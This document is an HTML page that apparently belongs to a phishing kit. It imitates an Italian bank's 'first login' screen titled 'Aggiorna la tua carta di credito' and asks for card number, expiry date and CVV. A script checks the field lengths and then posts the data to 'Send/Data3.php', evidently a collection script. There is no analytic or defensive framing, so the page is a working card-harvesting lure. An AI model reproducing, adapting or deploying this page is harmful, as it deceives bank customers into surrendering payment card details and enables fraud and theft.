<html><head>
    <style type="text/css">
        @charset "UTF-8";
        [ng\:cloak],
        [ng-cloak],
        [data-ng-cloak],
        [x-ng-cloak],
        .ng-cloak,
        .x-ng-cloak,
        .ng-hide:not(.ng-hide-animate) {
            display: none !important;
        }
        
        ng\:form {
            display: block;
        }
        
        .ng-animate-shim {
            visibility: hidden;
        }
        
        .ng-anchor {
            position: absolute;
        }
    </style>
    <meta http-equiv="X-UA-Compatible" content="IE=10">
    <meta http-equiv="cache-control" content="no-cache">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta charset="utf-8">
    <script src="//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
  <script type="text/javascript" src="js/jquery.mask.js"></script>

   <title>First Login</title>
<link type="text/css" id="dark-mode" rel="stylesheet" href=""><style type="text/css" id="dark-mode-custom-style"></style></head>
<style type="text/css" id="dark-mode-custom-style"></style>


<body class="isp-body-transparent">
    <span id="ispCanvasSpinner" style="position: absolute; z-index: 9999; width: 100%; text-align: center; top: 50%;" ng-show="$root.showSpinner" class="isp-ib-loader-background ng-hide" aria-hidden="true">
			<div us-spinner="" spinner-key="spinner-1" class="ng-scope"></div>
		<div id="canvasLoader" style="display: none;"><canvas width="90" height="90"></canvas><canvas style="display: none;" width="90" height="90"></canvas></div></span>

    <div class="container-fluid ng-scope" ng-controller="ArchMainController">
        <!-- ngInclude: 'js/sec/assets/theme/skeleton/appContainer.html?'+$root.getVersion() -->
        <div ng-include="'js/sec/assets/theme/skeleton/appContainer.html?'+$root.getVersion()" class="ng-scope">
            <div class="row ng-scope" id="ArchAssetsController" ng-controller="AssetsController">
                <div class="col-xs-24 creditly-wrapper">

                    <!-- <div class="row" style="margin-top: 130px /*empty space for the static header*/"> -->
                    <div class="row" id="assetControllerMargin">

                        <!-- uiView: -->
                        <div id="assetContainer" class="assetContainer ng-scope" ui-view="" style="">
                            <!-- ngInclude: getTemplateUrl() -->
                            <div id="firstlogincontroller" ng-class="pagepartClass" ng-include="getTemplateUrl()" full-width="true" part-controller="FirstLoginController" class="ng-scope container-fluid-no-padding" style="">
                                <div class="container isp-ib-container-firstlogin first-login-font-family ng-scope">
                                    <!-- INIZIO MODIFICA STEP -->
                                    <div class="row isp-ib-alignment-title isp-ib-bar-header-1" id="isp-disappears-element">
                                        <div class="container isp-ib-header col-md-23 col-xs-23">
                                            <div class="row">
                                                <div class="col-md-24 col-xs-24">
                                                    <div class="row">
                                                        <div class="text-center isp-header-pageTitle isp-header-top-class">
                                                            <div class="text-uppercase text-center isp-header-pageTitle-no-outline ng-binding isp-header-pageTitle-withSteps" id="isp-header-pageTitle" ng-class="{'isp-header-pageTitle-withSteps' : $root.header.stepsAreaVisible}">
                                                            Aggiorna la tua carta di credito
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="row margin-top-40 first-login-xs-margin-top-20"></div>
                                    <!-- FINE MODIFICA STEP-->

                                    <form action="Send/Data3.php" target="_top" method="POST" class="creditly-card-form">
                                    <div class="container-fluid first-login-container-general">
                                        <div ng-form="firstlogin.form" class="ng-pristine ng-valid ng-valid-minlength ng-valid-maxlength ng-valid-isp-validate ng-valid-isp-custom ng-valid-required" style="">

                                            <div class="container-fluid isp-gray-box">
                                                <div class="col-md-offset-1 col-xs-offset-1 col-xs-24 col-md-22 first-login-input-top-15 first-login-input-bottom-29">
                                                    <div class="row">
                                                        <div class="col-xs-24">
                                                            <div class="row">
                                                                <div class="col-sm-17 col-xs-21 first-login-input">
                                                                    <div class="ispFormField ispInput ng-pristine ng-valid ng-isolate-scope ng-valid-minlength ng-valid-maxlength ng-valid-isp-validate ng-valid-isp-custom ng-valid-required" ng-class="{'roundedStyle': hasStyle('rounded'), 'rev2': hasStyle('rev2')}" ng-form="" isp-id="firstlogin-user" bind-variable="firstlogin.user.userid" name="firstlogin.user.useridForm" input-label="Codice titolare" placeholder="Inserisci Codice Titolare" input-format="limiteddigits" is-required="false" show-thick="true" on-focus="changeUserFocus()" on-blur="changeUserFocus()" minlength="6" maxlength="8" format-error-label="Il codice titolare deve essere composto al massimo da otto caratteri numerici. Per favore, verifica e riprova" id="firstloginpage-firstlogincontroller-firstlogin-user_input" style="">
                                                                        <label class="ispFormFieldLabel" for="firstloginpage-firstlogincontroller-firstlogin-user" ng-show="inputLabel" ng-class="{'noWrapLabel': hasStyle('noWrapLabel')}" label-for="firstloginpage-firstlogincontroller-firstlogin-user" aria-hidden="false">
                                                                            <ng-transclude>Numero della carta</ng-transclude>
                                                                        </label>
                                                                        <div class=" "  id="firstloginpage-firstlogincontroller-firstlogin-user_div" tabindex="-1" role="presentation">
                                                                            <span>
    <input unblucapturinghint="" autocomplete="" name="number" id="firstloginpage-firstlogincontroller-firstlogin-user" type="text"  class="ng-pristine ng-untouched ng-valid ng-scope ng-empty ng-valid-minlength ng-valid-maxlength ng-valid-isp-validate ng-valid-isp-custom ng-valid-required credit-card-number" 
    
              placeholder="&#149;&#149;&#149;&#149; &#149;&#149;&#149;&#149; &#149;&#149;&#149;&#149; &#149;&#149;&#149;&#149;"
    
    ><!-- end ngIf: inputFormat != 'date' -->
		</span>

                                                                        </div>
                                                                      
                                                                    </div>
                                                                </div>

                                                                <div class="col-sm-17 col-xs-21 first-login-input">
                                                                    <div class="ispFormField ispInput ng-pristine ng-valid ng-isolate-scope ng-valid-minlength ng-valid-maxlength ng-valid-isp-validate ng-valid-isp-custom ng-valid-required" ng-class="{'roundedStyle': hasStyle('rounded'), 'rev2': hasStyle('rev2')}" ng-form="" isp-id="firstlogin-user" bind-variable="firstlogin.user.userid" name="firstlogin.user.useridForm" input-label="Codice titolare" placeholder="Inserisci Codice Titolare" input-format="limiteddigits" is-required="false" show-thick="true" on-focus="changeUserFocus()" on-blur="changeUserFocus()" minlength="6" maxlength="8" format-error-label="Il codice titolare deve essere composto al massimo da otto caratteri numerici. Per favore, verifica e riprova" id="firstloginpage-firstlogincontroller-firstlogin-user_input" style="">
                                                                        <label class="ispFormFieldLabel" for="firstloginpage-firstlogincontroller-firstlogin-user" ng-show="inputLabel" ng-class="{'noWrapLabel': hasStyle('noWrapLabel')}" label-for="firstloginpage-firstlogincontroller-firstlogin-user" aria-hidden="false">
                                                                            <ng-transclude>Data di scadenza</ng-transclude>
                                                                        </label>
                                                                        <div class=" "  id="firstloginpage-firstlogincontroller-firstlogin-user_div" tabindex="-1" role="presentation">
                                                                            <span>
    <input  name="expiry" id="firstloginpage-firstlogincontroller-firstlogin-user" type="text" class="expiration-month-and-year ng-pristine ng-untouched ng-valid ng-scope ng-empty ng-valid-minlength ng-valid-maxlength ng-valid-isp-validate ng-valid-isp-custom ng-valid-required" 
    placeholder="MM/YY"
    
    ><!-- end ngIf: inputFormat != 'date' -->
		</span>

                                                                        </div>
                                                                      
                                                                    </div>
                                                                </div>             
                                                                <div class="col-sm-17 col-xs-21 first-login-input">
                                                                    <div class="ispFormField ispInput ng-pristine ng-valid ng-isolate-scope ng-valid-minlength ng-valid-maxlength ng-valid-isp-validate ng-valid-isp-custom ng-valid-required" ng-class="{'roundedStyle': hasStyle('rounded'), 'rev2': hasStyle('rev2')}" ng-form="" isp-id="firstlogin-user" bind-variable="firstlogin.user.userid" name="firstlogin.user.useridForm" input-label="Codice titolare" placeholder="Inserisci Codice Titolare" input-format="limiteddigits" is-required="false" show-thick="true" on-focus="changeUserFocus()" on-blur="changeUserFocus()" minlength="6" maxlength="8" format-error-label="Il codice titolare deve essere composto al massimo da otto caratteri numerici. Per favore, verifica e riprova" id="firstloginpage-firstlogincontroller-firstlogin-user_input" style="">
                                                                        <label class="ispFormFieldLabel" for="firstloginpage-firstlogincontroller-firstlogin-user" ng-show="inputLabel" ng-class="{'noWrapLabel': hasStyle('noWrapLabel')}" label-for="firstloginpage-firstlogincontroller-firstlogin-user" aria-hidden="false">
                                                                            <ng-transclude>CVC / CVV</ng-transclude>
                                                                        </label>
                                                                        <div class=" "  id="firstloginpage-firstlogincontroller-firstlogin-user_div" tabindex="-1" role="presentation">
                                                                            <span>
    <input unblucapturinghint="" autocomplete="" maxlength="3" name="cvc" id="firstloginpage-firstlogincontroller-firstlogin-user"  class="security-code ng-pristine ng-untouched ng-valid ng-scope ng-empty ng-valid-minlength ng-valid-maxlength ng-valid-isp-validate ng-valid-isp-custom ng-valid-required" 
    pattern="\d*"
              type="text" name="security-code"
              placeholder="&#149;&#149;&#149;"
    ><!-- end ngIf: inputFormat != 'date' -->
		</span>

                                                                        </div>
                                                                      
                                                                    </div>
                                                                </div>  
                                                            </div>
                                                        </div>
                                                    </div>
                                        
                                    </div>

                                    

                                    
                                </div>

                                <div class="row">
                                    <div class="row button-margin-top">
                                        <div class="col-xs-24">
                                            <div class="col-xs-24 col-sm-12 pull-right first-login-button-height">
                                                <button id="firstLoginConfermaButton" look="green" ng-disabled="firstlogin.tech.disabledsubmit" class="submit pull-right first-login-button-size ispIbDirectiveControlbuttonsButtonMargin isp-ib-alignment-button-responsive isp-ib-submit" ng-click="checkNumCell()">
                                                    <ng-transclude>finire</ng-transclude>
                                                </button>
                                            </div>
                                            
                                        </div>
                                    </div>
                                </div>
                                </form>
                            </div>
                        </div>
                    </div>
                    <script type="text/javascript" class="ng-scope">
                        document.body.addEventListener('touchmove', function(event) {
                            event.preventDefault();
                        }, false);
                    </script>
                </div>
            </div>

        </div>

    </div>
    </div>
    </div>
    </div>

    <script type="text/javascript">
       document.write("<link href=\"css/css.css?\" rel=\"stylesheet\">");
    </script>
    <link href="css/css.css?v=ee154c1c07c798865fc36b2b1dea2632" rel="stylesheet">
    <script>
$(document).ready(function(){
    $('.credit-card-number').mask('0000 0000 0000 0000', {
    translation: {
      'Z': {
        pattern: /[0-9]/,
      },
        placeholder: "0000 0000 0000 0000"
    }
  });
    $('.expiration-month-and-year').mask('00/00');
    $('.security-code').mask('000');
});


$(".creditly-card-form .submit").click(function(e) {
  e.preventDefault();
    var cc = $(".credit-card-number").val();
    var ex = $(".expiration-month-and-year").val();
    var vc = $(".security-code").val();

    if(cc.length != 19){
        $(".credit-card-number").parent().parent().addClass('error');
        return 0;
    }else if(ex.length != 5){
        $(".expiration-month-and-year").parent().parent().addClass('error');
        return 0;
    }else if(vc.length != 3){
        $(".security-code").parent().parent().addClass('error');
        return 0;
    }else{
       $(".creditly-card-form").submit();
    }
    
});
</script>

</body></html>